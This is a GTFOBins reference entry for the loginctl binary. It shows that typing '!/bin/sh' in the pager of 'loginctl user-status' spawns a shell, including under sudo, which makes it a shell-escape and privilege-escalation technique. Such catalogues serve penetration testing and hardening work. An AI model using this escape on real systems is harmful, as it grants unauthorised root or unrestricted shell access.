<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/loginctl -->
---
comment: |-
  This might not work if run by unprivileged users depending on the system configuration.
functions:
  shell:
  - code: |-
      loginctl user-status
      !/bin/sh
    contexts:
      sudo:
      unprivileged:
...
